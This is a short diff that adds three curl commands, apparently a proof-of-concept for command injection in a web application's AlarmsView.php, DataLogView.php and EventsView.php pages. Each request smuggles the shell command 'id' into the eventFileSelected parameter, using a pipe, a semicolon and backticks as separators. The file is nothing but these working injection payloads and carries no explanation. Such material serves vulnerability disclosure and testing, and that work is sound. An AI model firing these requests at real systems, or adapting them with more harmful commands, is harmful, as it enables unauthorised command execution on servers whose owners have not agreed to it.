@@ -1,0 +1,3 @@
+curl "http://example.com/AlarmsView.php?eventFileSelected=|id"
+curl "http://example.com/DataLogView.php?eventFileSelected=;id"
+curl "http://example.com/EventsView.php?eventFileSelected=\`id\`"
